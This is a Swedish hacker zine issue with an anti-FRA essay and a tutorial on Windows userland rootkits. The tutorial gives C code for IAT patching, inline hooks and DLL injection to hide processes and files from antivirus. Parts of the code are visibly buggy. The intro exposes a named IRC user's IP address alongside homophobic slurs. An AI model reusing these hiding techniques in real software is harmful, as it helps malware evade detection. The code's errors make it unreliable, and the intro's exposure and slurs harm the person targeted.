@@ -1,0 +1,2937 @@
+[==============================================================================]
+          echo $hack. "FREEDOM OF SPEECH, USE IT OR LOSE IT!"  - = == ===- -===]
+            -      =     =    =   = ===   === == === == = = =========== -===- =]
+
+             ___ ___          __    __________.__               
+            /   |   \   ____ |  | __\____    /|__| ____   ____  
+           /    ~    \_/ ___\|  |/ /  /     / |  |/    \_/ __ \ 
+           \    Y    /\  \___|    <  /     /_ |  |   |  \  ___/ 
+            \___|_  /  \___  >__|_ \/_______ \|__|___|  /\___  >
+                  \/       \/     \/        \/        \/ 0x04\/ 
+
+                                             ERRATA
+                                             - NO NEED LOL SO PRO!! SO PRO WE R!
+
+================================================================================
+Index 
+================================================================================
+ HckZine goes signed
+ |
+ V
+0xFF Intro...............................................................Spejnar
+
+0x00 Förtroendevalda......................................................Retard
+0x01 Rootkits i Windows...................................................sasha^
+0x02 Bootbar kod för x86 - Del 1........................................swestres
+0x03 PHP-Virus, teori och praktik, del 2..................................R34p3r
+0x04 Introduktion till C#, del 4..........................................Retard
+0x05 Introduktion till C#, del 4 - uppgifter..............................Retard
+
+0x06 Outro..............................................................swestres
+
+================================================================================
+0xFF Intro...............................................................Spejnar
+================================================================================
+
+Ännu en gång reser sig den blodige kämpen ur krigets hetta. Nä fan, det här 
+funkar inte. Vart är den självutnämnde poesibögen #1?
+
+zine@burk:~/code/zine$ cat intro.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <unistd.h>
+
+int main()
+{
+   int iSocket, iRet;
+   struct sockaddr_in sHost;
+   char knark[512];
+
+   iSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+   sHost.sin_family = AF_INET;
+   sHost.sin_port = 0x0B1A;
+   sHost.sin_addr.s_addr = 0x29055058;
+
+   connect(iSocket, (struct sockaddr*)&sHost, sizeof(sHost));
+
+   send(iSocket, "NICK introhaxx\x0d\x0a", 16, 0);
+   send(iSocket, "USER hax hax irc.swepipe.se :hax\x0d\x0a", 34, 0);
+   send(iSocket, "WHOIS odlan\x0d\x0a", 13, 0);
+
+   while((iRet = recv(iSocket, &knark, 512, 0)) > 0) {
+      knark[iRet] = '\0';
+      printf("%s", knark);
+   }
+   return 0;
+}
+zine@burk:~/code/zine$ gcc intro.c -o intro && ./intro
+:irc.swepipe.se NOTICE AUTH :*** Looking up your hostname...
+:irc.swepipe.se NOTICE AUTH :*** Checking Ident
+:irc.swepipe.se NOTICE AUTH :*** Found your hostname...
+:irc.swepipe.se NOTICE AUTH :*** Checking Ident
+:irc.swepipe.se NOTICE AUTH :*** No Ident response             ; cuttad
+:irc.swepipe.se 375 introhaxx :- irc.swepipe.se Message of the Day - 
+:irc.swepipe.se 372 introhaxx :- He jacked in.
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :- Nothing. Gray void. No matrix, no grid. No 
+:irc.swepipe.se 372 introhaxx :- cyberspace.
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :- The deck was gone. His fingers were. . .
+:irc.swepipe.se 372 introhaxx :- And on the far rim of consciousness, a 
+:irc.swepipe.se 372 introhaxx :- scurrying, a fleeting
+:irc.swepipe.se 372 introhaxx :- impression of something rushing toward him
+:irc.swepipe.se 372 introhaxx :- , across leagues
+:irc.swepipe.se 372 introhaxx :- of black mirror.
+:irc.swepipe.se 372 introhaxx :- He tried to scream.
+:irc.swepipe.se 372 introhaxx :-              -- Neuromancer, by William Gibson
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :- welcome to...
+:irc.swepipe.se 372 introhaxx :-           _____ _   _________       ________
+:irc.swepipe.se 372 introhaxx :-   ________\___ : \__\___  ,_ \______\___    \
+:irc.swepipe.se 372 introhaxx :-   \___     \   |  \    \ ____/___   ,_ \  :__\
+:irc.swepipe.se 372 introhaxx :-     /   \___\  '   \ :__\  \   /   ____/  `  /
+:irc.swepipe.se 372 introhaxx :-    /   ,     \ _   / `  /  /  /  /   \  ____/
+:irc.swepipe.se 372 introhaxx :-    \___\__   /__\_/  __/__/   \_/__  /___/
+:irc.swepipe.se 372 introhaxx :-         \___/    \___/    \____/ \__/
+:irc.swepipe.se 372 introhaxx :-  i r c.       s w e p i p e               .se
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :-          hosted by PRQ AB - www.prq.se
+:irc.swepipe.se 372 introhaxx :-         "lightning never strikes twice"
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 372 introhaxx :-         co-location - dedicated servers
+:irc.swepipe.se 372 introhaxx :-          webhosting - privacy services
+:irc.swepipe.se 372 introhaxx :-       freedom of speech - freedom of press
+:irc.swepipe.se 372 introhaxx :-   freedom of association - freedom of commerce
+:irc.swepipe.se 372 introhaxx :-         "lightning never strikes twice"
+:irc.swepipe.se 372 introhaxx :- 
+:irc.swepipe.se 376 introhaxx :End of /MOTD command.
+:irc.swepipe.se 311 introhaxx odlan ~gay pride.fra.se * :Unknown
+:irc.swepipe.se 312 introhaxx odlan irc.efnet.nl :hm
+:irc.swepipe.se 301 introhaxx odlan :bbl, pride                          ; GAY
+:irc.swepipe.se 338 introhaxx odlan 194.18.169.38 :actually using host
+:irc.swepipe.se 318 introhaxx odlan :End of /WHOIS list.
+
+; End of story
+
+I detta nummer värmer Retard upp läsaren med ett inlägg i FRA-debatten. sasha^
+följer med en inblick i hur userland rootkits fungerar under windows. Efter det
+bjuder swestres oss på en hårdvarunära tur i 16-bitars real mode.
+Avslutningsvis fortsätter R34p3r och Retard med sina artikelserier.
+
+Vi är nu uppe i zine #4. Under tiden har formatet och skribenterna utvecklats 
+och fortsättningen ska inte göra någon besviken. Någon anonym skribent har
+bidragit med intressant information men vi söker fortfarande seriöst folk som 
+vill dela med sig av sina åsikter inom hacktivism. Over and out.
+
+================================================================================
+0x00 Förtroendevalda                                                      Retard
+================================================================================
+
+Vi valde in ett par partier till att styra och ställa i Sverige, det var en blå
+regering. Till en början märkte man inte av någonting, men allt eftersom att den
+nya regeringen blivit varma i kläderna börjar lagar och regler införas. I allt
+snabbare takt, vi hinner inte med längre. Vi ser en så kallad FRA-lag, en lag
+som tillåter en CIVIL myndighet att övervaka all vår kommunikation med utlandet,
+oavsett om du är misstänkt för ett brott eller ej. Låter du intressant riskerar
+du att få all trafik bevakad, du kan ju faktiskt vara en terrorist.
+
+Våra förtroendevalda klubbade igenom denna lag, de ansåg att de visste vad de
+pysslade med. Andra förtroendevalda röstade för lagen, även att de var emot den.
+Det är hemskt hur mycket ett parti kan påverka individer som ska nyttja sin 
+rösträtt. Man kan tro att en lag som innebär ett intrång på den personliga
+integriteten måste ha stort stöd bland befolkningen, men med facit i hand är
+det befolkningen som nu istället räds den nya lagen.
+- Vad händer när USA vill ha information om Kalle som pratar med Ali
+ifrån Irak?
+- Vad händer när FRA börjar missbruka sökparametrarna?
+- Vad händer när RIAA vill ha information om Erik som laddar ned musik?
+
+En omtalad lag, men protesterna kom väldigt sent. Media tog knappt upp lagen
+innan den var igenomklubbad. En vanlig lag kan man ju inte prata om, att
+Natascha plockat ut brösten är faktiskt mycket viktigare!
+
+Och nu, regeringen rullar på med allt fler lagar. Med tanke på hur många som
+fildelar är det dags att ge sig på dem också. Att de röstade på Moderaterna
+ska de då ta mig tusan få ångra!
+Regeringen vill nu att en domstol ska kunna tvinga Internetleverantörer
+till att lämna ut information om vem som äger en IP-adress, när den använts
+till att ladda ned olagliga filer. Det är dags att ge merparten av
+svenskarna en faktura på ett par tusen, om de vill slippa rättegång.
+
+I realiteten, betyder detta att RIAA kan få ut information om en IP-adress som
+inte ens polisväsendet kan få fram. Man kommer nu inte behöva begå ett brott
+som kan ge två års fängelse för att få ut information om en IP-adress.
+Nu räcker det att ha laddat ned Kung Fu Panda för att få uppgifterna
+publika.
+
+Ska vi slå vad om att både Beatrice Ask, Justitieminister och Lena
+Adelsohn Liljeroth, Kulturminister har laddat ned film och musik på
+Internet?
+Om så nu inte är fallet, är de så pass säkra på att ingen laddat ned musik
+ifrån deras uppkoppling att de vill införa en lag som gör att de kan bli
+tvungna till att betala tusenlappar för vad någon annan gjort? Det tror inte
+jag.
+
+                   Gratis inträde till museum?
+                   Gratis tillgång till musik!
+                                             
+================================================================================
+0x01 Rootkits i Windows                                                   sasha^
+================================================================================
+
+Om artikeln
+===========
+
+Denna artikel kommer behandla grunderna i rootkits främst avsedda för Windows 
+Vista. Det är ingen utförlig manual som listar alla metoder för att nå det 
+avsedda målet, utan är mera tänkt som en grundlig introduktion bakom hur 
+rootkits fungerar med olika tillvägagångssätt beskrivna samt exempel skrivna i C
+
+Vad är ett rootkit?
+===================
+
+Ett rootkit är ett program vars syfte är att dölja processer, anslutningar,
+filer eller poster i registret. Ofta används rootkits tillsammans med RATs 
+eller skadlig kod för att dölja dess existens. Även vid analys av olika program 
+kan de tekniker som rootkits använder sig av vara nyttiga. Rootkits har 
+existerat länge i olika former. Till en början var det vanligt att man ersatte
+specifika filer för att uppnå sitt mål. Sedan dess har teknikerna utvecklats 
+enormt till det vi har idag.
+
+x86-privilegier
+===============
+
+Under x86 (32 bitars) finns ett antal ringar för att begränsa åtkomst. Om alla 
+processer i ett system skulle köras på samma nivå vore säkerheten väldigt svår 
+att hantera. Ringarna benämns 0 till 3, där ring 0 har fulla rättigheter. Under 
+Linux och Windows används endast ring 0 och 3, då de tillfredställer behoven. 
+Under Windows körs kernel med bl.a. drivrutiner i ring 0. På andra sidan, i ring 
+3, exekverar vanliga processer som anteckningar i userland. Vid vissa tillfällen 
+kan åtkomst möjliggöras för ring 3 till ring 0.
+
+Grunderna
+=========
+
+När man skriver rootkits strävar man alltid efter att köra koden på så låg nivå 
+som möjligt, ring 0, sett från x86 design. Samtidigt måste det göras en 
+avvägning mellan funktionaliteten, invecklad kod och kompabiliteten. Om man vill 
+köra koden på så låg nivå som möjligt, faller kernel-nivån oss naturligt i 
+smaken. Det innebär dockstora svårigheter att skriva drivrutiner vars syften är 
+att dölja olika egenskaper.En annan nackdel är att den användaren som exekverar 
+koden måste vara lokal administratör, vilket knappast är en självklarhet. Nu 
+kanske userland låter som det självklara valet men även det har nackdelar. Men 
+först, varför vill man exekvera koden på såg låg nivå som möjligt? Det är p.g.a. 
+av anti-virus (AV) och brandväggar (FW) som tillämpar liknande tekniker för att 
+avslöja rootkits. Förenklat sett så är vinnaren oftast den som ligger på lägst 
+nivå. Då majoriteten av dagens AVs och FWs körs i kernel, räcker inte userland 
+till för att koden ska bli undetected (UD). I den här artikeln kommer jag endast 
+behandla userland, vilket är en nödvändighet  för fortsatt skapande av kod för 
+kernel.
+
+Hur döljs processer, filer...?
+-------------------------------------
+
+Det finns ett flertal tekniker för att lura Windows. Det här dokumentet 
+behandlar IAT-patching och detour/inline hook. Förenklat innebär detta att man
+ersätter systemanrop med våra egna funktioner som agerar utifrån vissa nyckelord
+te.x. filnamn, i datan.
+
+Låt oss ta funktionen strcmp för att visa ett simpelt exempel. Funktionens 
+prototyp:
+
+int strcmp(const char * string1, const char * string2);
+
+strcmp jämför två strängar och returnerar 0 om de är likvärdiga. Om man nu vill 
+kolla med vilka strängar ett program anropar funktionen kan man skriva en egen.
+
+int HookedStrcmp(const char * string1, const char * string2)
+{
+   char msg[100];
+
+   msg = "HookedStrcmp(";
+   strcat(msg, string1);
+   strcat(msg, ", ");
+   strcat(msg, string2);
+   strcat(msg, ");");
+ 
+   MessageBoxA(0, msg, "Hooked call", MB_OK);
+
+   return strcmp(string1, string2);
+}
+
+Om originalet ersätts med HookedStrcmp kommer MessageBoxA anropas varje gång med 
+de argument som angavs. originalet kommer fortfarande fungera då hooket 
+returnerar den vanliga funktionen innan return. Genom att ersätta funktioner på 
+ett liknande sätt, kan man kontrollera vilka data som behandlas och returneras. 
+För att förstå hur funktioner ersätts med andra, behövs kunskap i PE formatet.
+
+PE
+--
+
+Alla dll- och exe-filer i Windows använder Portable Executable (PE) formatet.
+Det består av olika headers och sektioner som beskriver hur som beskriver vad 
+koden kräver och hur den ska användas. Både filer på disk och i minnet använder 
+sig av formatet, dock med mindre skillnader. När man ska ersätta funktionsanrop 
+behöver vissa sektioner uppdateras i minnet hos den aktuella filen. Vårt mål är 
+att ersätta en del av de adresser som finns i Import Address Table (IAT) för att 
+de ska peka på våra egna funktioner.
+
+IAT innehåller de funktioner som importeras, även kallade imports. När te.x. 
+MessageBoxA anropas i koden hoppar inte exekveringen direkt till koden. Detta 
+skulle innebära skillnader i adresser för funktioner mellan olika uppdateringar 
+av operativsystemet. För att lösa detta använder PE en tabell med adresser och 
+funktionsnamn som uppdateras vid exekvering av programmet. Vid anrop av en anrop 
+av en funktion i ett program hoppar exekveringen till den adress som är angiven 
+i IAT. Detta är en smart lösning med ett stort bakslag, man kan uppdatera 
+adresserna så att de pekar på andra funktioner.
+
+Basadressen utvinner man genom att anropa GetModuleHandle och casta resultatet 
+till en unsigned long. Funktionen returnerar basadressen till det aktuella 
+programmet, även om den anropas från en dll.
+
+unsigned long ulBaseAddr = (unsigned long) GetModuleHandle(NULL);
+
+Basadressen behövs då den första strukturen, PIMAGE_DOS_HEADER, börjar där.
+De definitioner som följer här är kopierade direkt från WinNt.h. För att skapa 
+en struktur som innehåller den aktuella filens PIMAGE_DOS_HEADER, används
+följande:
+
+PIMAGE_DOS_HEADER pimgDosHeader = (PIMAGE_DOS_HEADER) ulBaseAddr;
+
+Deklaration:
+
+typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
+    WORD   e_magic;                     // Magic number
+    WORD   e_cblp;                      // Bytes on last page of file
+    WORD   e_cp;                        // Pages in file
+    WORD   e_crlc;                      // Relocations
+    WORD   e_cparhdr;                   // Size of header in paragraphs
+    WORD   e_minalloc;                  // Minimum extra paragraphs needed
+    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
+    WORD   e_ss;                        // Initial (relative) SS value
+    WORD   e_sp;                        // Initial SP value
+    WORD   e_csum;                      // Checksum
+    WORD   e_ip;                        // Initial IP value
+    WORD   e_cs;                        // Initial (relative) CS value
+    WORD   e_lfarlc;                    // File address of relocation table
+    WORD   e_ovno;                      // Overlay number
+    WORD   e_res[4];                    // Reserved words
+    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
+    WORD   e_oeminfo;                   // OEM information; e_oemid specific
+    WORD   e_res2[10];                  // Reserved words
+    LONG   e_lfanew;                    // File address of new exe header
+  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
+
+Den intressanta medlemmen här är e_lfanew. Den innehåller en Relative Virtual
+Address (RVA) som pekar på PIMAGE_NT_HEADERS. Eftersom det är en relativ adress
+adderas RVA med basadressen, som sparades tidigare.
+
+PIMAGE_NT_HEADERS pimgNtHeaders = (PIMAGE_NT_HEADERS)
+(pimgDosHeader->e_lfanew + ulBaseAddr);
+
+Deklaration (PIMAGE_NT_HEADERS är deffad till PIMAGE_NT_HEADERS32 på x86):
+
+typedef struct _IMAGE_NT_HEADERS {
+    DWORD Signature;
+    IMAGE_FILE_HEADER FileHeader;
+    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
+
+Här kikar vi vidare på OptionalHeader. Deklaration av IMAGE_OPTIONAL_HEADER32:
+
+typedef struct _IMAGE_OPTIONAL_HEADER {
+    //
+    // Standard fields.
+    //
+
+    WORD    Magic;
+    BYTE    MajorLinkerVersion;
+    BYTE    MinorLinkerVersion;
+    DWORD   SizeOfCode;
+    DWORD   SizeOfInitializedData;
+    DWORD   SizeOfUninitializedData;
+    DWORD   AddressOfEntryPoint;
+    DWORD   BaseOfCode;
+    DWORD   BaseOfData;
+
+    //
+    // NT additional fields.
+    //
+
+    DWORD   ImageBase;
+    DWORD   SectionAlignment;
+    DWORD   FileAlignment;
+    WORD    MajorOperatingSystemVersion;
+    WORD    MinorOperatingSystemVersion;
+    WORD    MajorImageVersion;
+    WORD    MinorImageVersion;
+    WORD    MajorSubsystemVersion;
+    WORD    MinorSubsystemVersion;
+    DWORD   Win32VersionValue;
+    DWORD   SizeOfImage;
+    DWORD   SizeOfHeaders;
+    DWORD   CheckSum;
+    WORD    Subsystem;
+    WORD    DllCharacteristics;
+    DWORD   SizeOfStackReserve;
+    DWORD   SizeOfStackCommit;
+    DWORD   SizeOfHeapReserve;
+    DWORD   SizeOfHeapCommit;
+    DWORD   LoaderFlags;
+    DWORD   NumberOfRvaAndSizes;
+    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
+} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
+
+Här finns en del självförklariga medlemmar med information om storleken på de 
+olika sektionerna i avbildningen. AddressOfEntryPoint är ett RVA som pekar på 
+första instruktionen i programmet. DataDirectory är en array av 
+IMAGE_DATA_DIRECTORY. Här alla element:
+
+#define IMAGE_DIRECTORY_ENTRY_EXPORT          0  //Export Directory
+#define IMAGE_DIRECTORY_ENTRY_IMPORT          1  //Import Directory
+#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2  //Resource Directory
+#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3  //Exception Directory
+#define IMAGE_DIRECTORY_ENTRY_SECURITY        4  //Security Directory
+#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5  //Base Relocation Table
+#define IMAGE_DIRECTORY_ENTRY_DEBUG           6  //Debug Directory
+//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7  //(X86 usage)
+#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7  //Architecture Specific Data
+#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8  //RVA of GP
+#define IMAGE_DIRECTORY_ENTRY_TLS             9  //TLS Directory
+#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10  //Load Configuration Directory
+#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11  //Bound Import Directory in 
+headers
+#define IMAGE_DIRECTORY_ENTRY_IAT            12  //Import Address Table
+#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13  //Delay Load Import Descriptors
+#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14  //COM Runtime descriptor
+
+DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] innehåller alltså en 
+IMAGE_DATA_DIRECTORY. Nu först kommer de delar av PE som berör IAT.
+
+Deklaration av IMAGE_DATA_DIRECTORY:
+
+typedef struct _IMAGE_DATA_DIRECTORY {
+    DWORD   VirtualAddress;
+    DWORD   Size;
+} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
+
+VirtualAddress är en RVA till en PIMAGE_IMPORT_DESCRIPTOR. För att sammanfatta 
+det hela användes följande rad för att beräkna adressen till 
+PIMAGE_IMPORT_DESCRIPTOR:
+
+PIMAGE_IMPORT_DESCRIPTOR pimgImportDesc = (PIMAGE_IMPORT_DESCRIPTOR) 
+(pimgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+.VirtualAddress + ulBaseAddr);
+
+Deklaration av IMAGE_DATA_DIRECTORY:
+
+typedef struct _IMAGE_IMPORT_DESCRIPTOR {
+    union {
+        DWORD   Characteristics;    // 0 for terminating null import descriptor
+        DWORD   OriginalFirstThunk; // RVA to original unbound IAT
+ (PIMAGE_THUNK_DATA)
+    }; 
+    DWORD   TimeDateStamp;          // 0 if not bound,
+               // -1 if bound, and real date\time stamp
+               //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
+               // O.W. date/time stamp of DLL bound to (Old BIND)
+
+    DWORD   ForwarderChain;                 // -1 if no forwarders
+    DWORD   Name;
+    DWORD   FirstThunk;                     // RVA to IAT
+} IMAGE_IMPORT_DESCRIPTOR;
+typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
+
+Det finns en IMAGE_IMPORT_DESCRIPTOR för varje dll applikationen importerar. 
+När man stegar till nästa dll användes pekararetmitk. Medlemmen Name är
+en nullterminerad sträng vars innehåll är namnet på dll-filen. Sista
+IMAGE_DATA_DIRECTORY sätter Name till '\0'.
+
+På disk pekar Characteristics till en array av IMAGE_ IMPORT_BY_NAME medans 
+OriginalFirstThunk används under runtime. OriginalFirstThunk är en RVA till 
+Import Name Table (INT). Denna används när man ska loopa genom de funktioner som 
+importeras. FirstThunk är en RVA till Import Address Table (IAT). Här finns de 
+adresser som pekar på olika funktioner. FirstThunk är en RVA till en array av 
+IMAGE_THUNK_DATA32.
+
+typedef struct _IMAGE_THUNK_DATA32 {
+    union {
+        PBYTE ForwarderString;
+        PDWORD Function;
+        DWORD Ordinal;
+        PIMAGE_IMPORT_BY_NAME AddressOfData;
+    } u1;
+} IMAGE_THUNK_DATA32;
+
+Function är adressen till funktionen. AddressOfData är adressen till en 
+IMAGE_IMPORT_BY_NAME som innehåller namnet på funktionen.
+
+Med dessa kunskaper kan nu de funktioner skrivas för att ersätta de adresser som
+pekar på orginalfunktionerna. Våran första funktion, hookFunction, tar emot ett
+argument av typen SHook. Detta är en struktur som lagrar info om ett hook.
+
+struct SHook
+{
+   char strDll[MAX_PATH], strFunction[MAX_PATH];
+   unsigned long vpHook;
+   void * vpOriginal;
+};
+
+Strukturen innehåller namn på den dll där funktionen ligger, funktionens namn, 
+adressen till den nya funktionen och en void* som pekar på originalet. 
+hookFunction sparar basadressen och loopar sedan genom alla poster i 
+PIMAGE_IMPORT_DESCRIPTOR. När funktionen hittar det korrekta biblioteket, 
+anropas patchDll() med oHook, den aktuella PIMAGE_IMPORT_DESCRIPTOR och 
+basadressen.
+
+bool hookFunction(SHook * oHook)
+{
+   unsigned long ulBaseAddr;
+   PIMAGE_DOS_HEADER pimgDosHeader;
+   PIMAGE_NT_HEADERS pimgNtHeaders;
+   PIMAGE_IMPORT_DESCRIPTOR pimgImportDesc;
+   char * cpDll;
+
+   ulBaseAddr = (unsigned long)GetModuleHandle(NULL);
+
+   pimgDosHeader = (PIMAGE_DOS_HEADER) ulBaseAddr;
+   pimgNtHeaders = (PIMAGE_NT_HEADERS) (pimgDosHeader->e_lfanew + ulBaseAddr);
+   pimgImportDesc = (PIMAGE_IMPORT_DESCRIPTOR) (pimgNtHeaders->
+OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + 
+ulBaseAddr);
+
+   for( ; pimgImportDesc->Name; pimgImportDesc++ )
+   {
+      cpDll = (char *) (pimgImportDesc->Name + ulBaseAddr);
+
+      printf("strcmp(%c, %c)\n",cpDll,oHook->strDll);
+      if( !strcmp(cpDll, oHook->strDll) )
+      {
+         printf("Hittade dll\n");
+         patchDll( oHook, pimgImportDesc, ulBaseAddr );
+         return true;
+      }
+   }
+
+   return false;
+}
+
+patchDll's syfte är att hitta IAT och INT, loopa igenom och kolla om den 
+aktuella u1.Ordinal är giltig. Om så är fallet sparas adressen till 
+IMAGE_IMPORT_BY_NAME och funktionens namn jämförs mot den som ska ersättas.
+Om funktionen hittas sparas adressen till originalet i oHook->m_vpOriginal. 
+Sedan tas det skrivskydd som finns på det aktuella minnesområdet bort med 
+VirtualProtect. Originalfunktionen, oHook->m_vpOriginal, ersätts med 
+oHook->m_vpHook och skrivskyddet återställs.
+
+
+void patchDll(SHook * oHook, PIMAGE_IMPORT_DESCRIPTOR pimgImportDesc
+, unsigned long ulBaseAddr)
+{
+   IMAGE_THUNK_DATA * pimgImportAddressTable, * pimgImportNameTable;
+   IMAGE_IMPORT_BY_NAME * pimgImport;
+
+   pimgImportAddressTable = (IMAGE_THUNK_DATA *) (pimgImportDesc->FirstThunk
+   + ulBaseAddr);
+   pimgImportNameTable = (IMAGE_THUNK_DATA *) 
+   (pimgImportDesc->OriginalFirstThunk + ulBaseAddr);
+
+   for( ; pimgImportAddressTable->u1.Function; pimgImportAddressTable++ 
+   && pimgImportNameTable++ )
+   {
+      if( !IMAGE_SNAP_BY_ORDINAL(pimgImportNameTable->u1.Ordinal) )
+      {
+         pimgImport = (IMAGE_IMPORT_BY_NAME *) 
+       (pimgImportNameTable->u1.AddressOfData + ulBaseAddr);
+
+         if( strcmp((char *)pimgImport->Name, oHook->m_strFunction) )
+            continue;
+
+         oHook->m_vpOriginal = (void *) pimgImportAddressTable->u1.Function;
+
+         unsigned long ulProtection, ulTemp;
+         VirtualProtect((void *)&pimgImportAddressTable->u1.Function
+       , sizeof(unsigned long), PAGE_EXECUTE_READWRITE, &ulProtection);
+
+         pimgImportAddressTable->u1.Function = oHook->m_vpHook;
+
+         VirtualProtect((void *) &pimgImportAddressTable->u1.Function
+       , sizeof(unsigned long), ulProtection, &ulTemp);
+
+      }
+   }
+}
+
+Detour/inline hook
+==================
+
+Som tidigare har nämnts så har patch av IAT ett flertal nackdelar. Den främsta
+är att eventuella funktionsanrop till GetProcAdress går oupptäckta förbi. Det 
+finns en lösning till detta där man tänker omvänt och ersätter instruktioner där 
+själva funktionen är. 
+
+Vi tar MessageBoxA som exempel. Första 15 bytes:
+
+8b ff 55 8b ec 83 3d b0 ac f6 77 0 f 85 e5
+
+Varje byte motsvarar en instruktion, med ett fåtal undantag. Genom att ersätta
+dessa med våra egna kan vi exekvera valfri kod vid varje anrop till funktionen.
+Det är enklast att genomföra detta med ett JMP som styr exekveringen till
+hook-funktionen direkt efter anropet till orginalfunktionen. Då
+orginalfunktionen måste anropas från den hookade så måste man även spara de 
+instruktioner som ersätts.
+
+Exempel som sparar de 15 första byte's i ucOld (unsigned char) från funktionens
+adress som finns sparad i addr (void *) sedan tidigare anrop till GetProcAddres.
+
+for( int i = 0; i < 15; i++)
+   ucOld[i] = *((unsigned char *)addr + i);
+   
+För att styra exekveringen användes ett JMP. Fölande instruktion gör ett FAR JMP
+till adressen 0x11223344 i userland:
+
+EA 44 33 22 11 1B 00
+
+Hela instruktionen tar alltså upp 7 bytes. EA är opcode för JMP FAR. 1B 00 anger
+att minnet i userland används. Då adressen till själva hook-funktionen ändras
+vid varje körning så kan den inte hårdkodas.
+
+Ovan nämnda kan sammanställas till följande kodstycke (m_vpHook är en
+unsigned long som innehåller adressen till hook-funktionen):
+
+char cpHook[4];
+*( (unsigned long *)cpHook ) = oHook->m_vpHook;
+
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
+
+char cpHook[4];
+
+WriteProcessMemory(hProcess, temp, "\xEA", 1, NULL);
+WriteProcessMemory(hProcess, (void *)((unsigned char *)temp + 1), cpHook, 4
+, NULL);
+WriteProcessMemory(hProcess, (void *)((unsigned char *)temp + 5), "\x1B\x00", 5
+, NULL);
+CloseHandle(hProcess);
+
+Nackdelen med att använda ett EA-jmp är att de första 7 bytes skiljer sig åt 
+mellan olika funktioner. Instruktioner har inte en fixerad längd på 1 byte, 
+vilket betyder att koden ovan kan lämna en halv instruktion kvar. Antingen kan 
+man ersätta de kvarvarande delarna med 0x90 (No Operation) eller så använder man 
+ett relativt jmp som endast kräver 5 bytes. Anledningen till att det senare 
+fungerar är att nästan alla funktioner har en likvärdig så kallad preamble på 5 
+bytes. Under Xp sp2 och Vista ser den ut som följande:
+
+8BFF    mov edi, edi
+55      push ebp
+8BEC    mov ebp, esp
+
+Första instruktionen motsvarar en 2 bytes NOP som inte utför någonting. 
+Anledningen till dess existens är att Microsoft använder inline hooks för 
+"hot patching". Detta innebär att vissa tjänster inte behöver startas om vid 
+uppdatering. Varför MS använder mov edi, edi istället för NOP NOP är ett 
+mysterium för mig. swestres gav dock en möjlig förklarning:
+
+[18:11:15:324]{swestres} Det är väl (kanske) för att en instruktion laddas 
+dubbelt så snabbt som två, fast med tanke på cache och skit så borde det spela 
+väldigt liten roll
+
+Den andra instruktionen pushar SFP (Saved Frame Pointer) och används senare till 
+att återställa ebp efter funktionen. Efter detta kopieras esp till ebp, vilket
+sätter upp en ny rampekare.
+
+Efter att vår hook-funktion har anropats så måste även orginalfunktionen anropas.
+Detta kräver att man sparar dess adress och använder den senare i ett jmp.
+
+*( (unsigned long *)&oHook->ucOld[13] ) = (unsigned long)((unsigned char *)temp 
++ 7);
+
+ucOld är bufferten där adressen sparas. temp + 7 motsvarar adressen till
+instruktionen som följer vårt jmp.
+
+Injecta kod
+===========
+
+Då varje process under Windows har en egen adressrymd, behöver man injecta koden
+i den andra processen innan den exekveras. Det finns ett flertal sätt att uppnå 
+det önskade resultatet, här demonstreras två. I båda situationerna behövs
+en dll och en "injector" som anropar dll:en.
+
+Globalt hook
+------------
+
+Under Windows finns så kallade hooks. Dessa består av en funktion som anropas 
+vid en viss händelse. För att applicera ett hook används SetWindowsHookEx. Som 
+input tar funktionen vilken typ av händelse den ska agera vid, funktionen som
+ska köras, en optionell handle dll:en funktionen ligger i, samt en parameter som 
+styr om hooket ska vara lokalt för en process eller gälla för alla. Vid
+användning av globalt hook är det lättast om funktionen ligger externt i en dll. 
+För att underlätta det hela har man två funktioner, hook och unhook, som anropas 
+från injectorn.
+
+DLL_EXPORT void hook(void)
+{
+   g_hHook = SetWindowsHookEx(WH_MOUSE, MouseProc, g_hInstance, 0);
+
+   if( !g_hHook )
+      dieWithError("SetWindowsHookEx failed");
+}
+
+DLL_EXPORT void unhook(void)
+{
+   if( !UnhookWindowsHookEx( g_hHook ) )
+      dieWithError("UnhookWindowsHookEx failed");
+}
+
+DLL_EXPORT LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
+{
+   return CallNextHookEx(g_hHook, code, wParam, lParam);
+}
+
